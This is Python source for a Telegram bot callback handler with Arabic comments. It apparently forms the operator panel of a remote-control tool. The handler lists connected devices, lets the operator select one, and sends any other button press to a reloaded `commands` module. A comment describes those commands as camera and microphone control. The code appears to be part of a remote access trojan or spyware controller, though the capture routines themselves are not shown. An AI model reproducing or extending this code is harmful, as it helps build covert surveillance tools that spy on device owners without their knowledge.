def _pc(self, u):
    cb = u.get('callback_query', {})
    uid = cb.get('id')
    if uid in self.p_upd:
        return
    self.p_upd.add(uid)
    if len(self.p_upd) > 200:
        self.p_upd.clear()

    cid = cb.get('message', {}).get('chat', {}).get('id')
    mid = cb.get('message', {}).get('message_id')
    d = cb.get('data', '')

    # ✅ إضافة سجل لمعرفة ما إذا كان الزر يصل (سيساعد في التصحيح)
    logging.info(f"Callback received: cid={cid}, data='{d}'")

    # الرد على الاستعلام لإزالة علامة التحميل من الزر
    try:
        self._ap("answerCallbackQuery", {"callback_query_id": uid})
    except:
        pass

    # التحقق من الجلسة
    if not self._auth(cid):
        self._ap("sendMessage", {"chat_id": cid, "text": "⚠️ الجلسة منتهية. يرجى /login مجدداً."})
        return

    # معالجة الأزرار
    if d == "main":
        self._ap("editMessageText", {
            "chat_id": cid,
            "message_id": mid,
            "text": "📋 القائمة الرئيسية",
            "reply_markup": json.dumps(self._km())
        })
    elif d == "ld":
        if not self.dvs:
            self._ap("editMessageText", {
                "chat_id": cid,
                "message_id": mid,
                "text": "📭 لا توجد أجهزة متصلة حالياً.",
                "reply_markup": json.dumps({
                    "inline_keyboard": [[{"text": "🔙 عودة", "callback_data": "main"}]]
                })
            })
            return
        kb = {"inline_keyboard":
              [[{"text": f"📱 {v['n']}", "callback_data": f"dev_{k}"}] for k, v in self.dvs.items()] +
              [[{"text": "🔙 عودة", "callback_data": "main"}]]}
        self._ap("editMessageText", {
            "chat_id": cid,
            "message_id": mid,
            "text": "<b>اختر جهازاً للتحكم:</b>",
            "reply_markup": json.dumps(kb),
            "parse_mode": "HTML"
        })
    elif d.startswith("dev_"):
        did = d.split("_")[1]
        if did in self.dvs:
            self._ap("editMessageText", {
                "chat_id": cid,
                "message_id": mid,
                "text": f"🕹️ التحكم بـ: <b>{self.dvs[did]['n']}</b>",
                "reply_markup": json.dumps(self._kd(did)),
                "parse_mode": "HTML"
            })
    elif d == "rnw":
        self.ses[str(cid)] = time.time() + 3600
        self._sv()
        self._ap("answerCallbackQuery", {
            "callback_query_id": uid,
            "text": "تم تجديد الجلسة ✅"
        })
    elif d == "ext":
        self.ses.pop(str(cid), None)
        self._sv()
        self._ap("editMessageText", {
            "chat_id": cid,
            "message_id": mid,
            "text": "🔒 تم تسجيل الخروج."
        })
    else:
        # ✅ تنفيذ الأوامر (كاميرا، ميكروفون، إلخ)
        try:
            import commands
            # إعادة تحميل الملف لضمان الجيل الأحدث
            import importlib
            importlib.reload(commands)
            # تنفيذ الأمر
            commands.ex(d, self, self.m, cid, uid)
        except Exception as e:
            logging.error(f"Command execution error: {e}")
            self._ap("sendMessage", {"chat_id": cid, "text": f"❌ خطأ في التنفيذ: {str(e)[:50]}"})
